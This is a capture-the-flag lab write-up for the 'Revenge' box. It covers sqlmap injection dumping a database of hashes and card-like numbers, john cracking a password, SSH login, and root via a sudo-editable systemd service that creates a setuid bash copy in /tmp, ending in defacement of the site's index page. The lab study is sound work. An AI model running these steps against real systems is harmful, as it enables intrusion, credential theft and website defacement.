#Revenge | Billy's revenge.


its running website on port 80.
--------------------------------------------------------------------
Running sqlmap to see if this website is vulnrable to sql injection or not.
--------------------------------------------------------------------
command: sqlmap -u http://revenge.thm/products/1 --current-db
--------------------------------------------------------------------

found current database: duckyinc
--------------------------------------------------------------------

searching tables for that database
--------------------------------------------------------------------
command: sqlmap -u http://revenge.thm/products/1 -D duckinc --tables
--------------------------------------------------------------------
we found 3 tables in this database.

Database: duckyinc                                                                                            
[3 tables]
+-------------+
| system_user |
| user        |
| product     |
+-------------+
--------------------------------------------------------------------
Now we will dump the data out from those 3 tables using the following command.
--------------------------------------------------------------------
Command: sqlmap -u http://revenge.thm/products/1 -D duckinc --dump
--------------------------------------------------------------------

Database: duckyinc                                                                                            
Table: system_user
[3 entries]
+----+----------------------+--------------+--------------------------------------------------------------+
| id | email                | username     | _password                                                    |
+----+----------------------+--------------+--------------------------------------------------------------+
| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
+----+----------------------+--------------+--------------------------------------------------------------+

---------------------------------------------------------------------------------------------------------------

Database: duckyinc                                                                                            
Table: user
[10 entries]
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| id | email                           | company          | username | _password                                                    | credit_card                |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| 1  | sales@fakeinc.org               | Fake Inc         | jhenry   | $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa | 4338736490565706           |
| 2  | accountspayable@ecorp.org       | Evil Corp        | smonroe  | $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm | 355219744086163            |
| 3  | accounts.payable@mcdoonalds.org | McDoonalds Inc   | dross    | $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C | 349789518019219            |
| 4  | sales@ABC.com                   | ABC Corp         | ngross   | $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO | 4499108649937274           |
| 5  | sales@threebelow.com            | Three Below      | jlawlor  | $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu | 4563593127115348           |

| 6  | ap@krasco.org                   | Krasco Org       | mandrews | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | thm{br3ak1ng_4nd_3nt3r1ng} |

| 7  | payable@wallyworld.com          | Wally World Corp | dgorman  | $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm | 4905698211632780           |
| 8  | payables@orlando.gov            | Orlando City     | mbutts   | $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS | 4690248976187759           |
| 9  | sales@dollatwee.com             | Dolla Twee       | hmontana | $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem | 375019041714434            |
| 10 | sales@ofamdollar                | O!  Fam Dollar   | csmith   | $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 | 364774395134471            |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+

--------------------------------------------------------------------
Got the 1st flag in database tables called: users entry no:6
and after that lets try to crack some hashes we got from database.
--------------------------------------------------------------------


so we got the hash for the users so lets try to crack some hashes.
-------------------------------------------------------------------
john --wordlist=/usr/share/wordlists/rockyou.txt s_admin.hash
-------------------------------------------------------------------

we found the password for server-admin: inuyasha


let try login to ssh using the credentials: server-admin:inuyasha
------------------------------------------------------------------
ssh server-admin@revenge.thm 
------------------------------------------------------------------

after login there is flag2 in home directory.

let try for prevesc.

lets find what sudo commands we can run from current users.
-----------------------------------------------------------------
command: sudo -l // To list all the sudo commands.
-----------------------------------------------------------------

so we found that we can run, restart and even edit duckyink.service as sudo so let edit it to prevesc.
-------------------------------------------------------------------
edit: ExecStart=/bin/bash /tmp/ro.sh
and even change 

User=root
Group=root
-------------------------------------------------------------------

lets create a script that we mentioned above in service.
command: nano /tmp/ro.sh

#!/bin/bash
cp /bin/bash /tmp/sh
chmod +s /tmp/sh
-------------------------------------------------------------------
Since we edited the service we need to reload daemon and after restarting the script executes as root.

command: sudo /bin/systemctl daemon-reload 
command: sudo /bin/systemctl restart duckyinc.service
-------------------------------------------------------------------

lets check that we have sh file in tmp folder.
command: ls /tmp
and then run the following command to get root access.

command: /tmp/sh -p # p to preserve euid
-------------------------------------------------------------------

now edit the index page as our mission is to deface the home page.

command: nano /var/www/duckyinc/templates/index.html

change any line of code.
-------------------------------------------------------------------

now check root folder for the final flag.
command: ls -l /root
found our last flag in root folder.
-------------------------------------------------------------------